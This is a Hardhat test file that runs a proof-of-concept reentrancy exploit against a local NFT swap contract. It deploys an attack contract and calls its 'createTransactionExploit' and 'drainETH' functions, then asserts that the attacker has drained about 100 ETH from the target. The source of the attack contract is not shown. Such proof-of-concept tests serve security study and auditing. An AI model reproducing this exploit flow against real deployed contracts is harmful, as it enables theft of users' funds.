const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("reentrancyAttack", function () {
  let sample1ERC721,
    sample2ERC721,
    exploit,
    reentrancyAttack,
    deployer,
    attacker,
    user1;

  before(async () => {
    [deployer, attacker, user1] = await ethers.getSigners();

    const sample1ERC721Factory = await ethers.getContractFactory(
      "sample1ERC721",
      deployer
    );
    sample1ERC721 = await sample1ERC721Factory.deploy();
    await sample1ERC721.deployed();

    const sample2ERC721Factory = await ethers.getContractFactory(
      "sample2ERC721",
      deployer
    );
    sample2ERC721 = await sample2ERC721Factory.deploy();
    await sample2ERC721.deployed();

    const exploitFactory = await ethers.getContractFactory(
      "NFTSwaper",
      deployer
    );
    exploit = await exploitFactory.deploy();
    await exploit.deployed();

    await sample1ERC721.connect(attacker).safeMint(77);
    await sample2ERC721.connect(user1).safeMint(99);

    expect(await sample1ERC721.ownerOf(77)).to.equal(attacker.address);
    expect(await sample2ERC721.ownerOf(99)).to.equal(user1.address);

    await deployer.sendTransaction({
      to: exploit.address,
      value: ethers.utils.parseEther("100"),
    });

    expect(await ethers.provider.getBalance(exploit.address)).to.equal(
      ethers.utils.parseEther("100")
    );
  });

  describe("attack", function () {
    it("deploy attack contract", async () => {
      const reentrancyAttackFactory = await ethers.getContractFactory(
        "reentrancyAttack",
        attacker
      );
      reentrancyAttack = await reentrancyAttackFactory.deploy(exploit.address);
      await reentrancyAttack.deployed();
    });

    it("transfer NFT into attack contract", async () => {
      await sample1ERC721
        .connect(attacker)
        .transferFrom(attacker.address, reentrancyAttack.address, 77);

      expect(await sample1ERC721.ownerOf(77)).to.equal(
        reentrancyAttack.address
      );
    });

    it("transfer ETH into attack contract", async () => {
      await attacker.sendTransaction({
        to: reentrancyAttack.address,
        value: ethers.utils.parseEther("10"),
        data: "0x0000",
      });

      expect(
        await ethers.provider.getBalance(reentrancyAttack.address)
      ).to.equal(ethers.utils.parseEther("10"));
    });

    it("reentry to get all ETH from target contract", async () => {
      await reentrancyAttack
        .connect(attacker)
        .createTransactionExploit(
          user1.address,
          sample1ERC721.address,
          sample2ERC721.address,
          77,
          99,
          ethers.utils.parseEther("10"),
          0
        );
      await reentrancyAttack.connect(attacker).drainETH(0);

      let delta = ethers.utils
        .parseEther("100")
        .sub(await ethers.provider.getBalance(attacker.address));

      //expect got ETH amount(- gas) is close to 100 ETH
      expect(delta).to.be.lt(ethers.utils.parseUnits("1", 17));
    });
  });
});
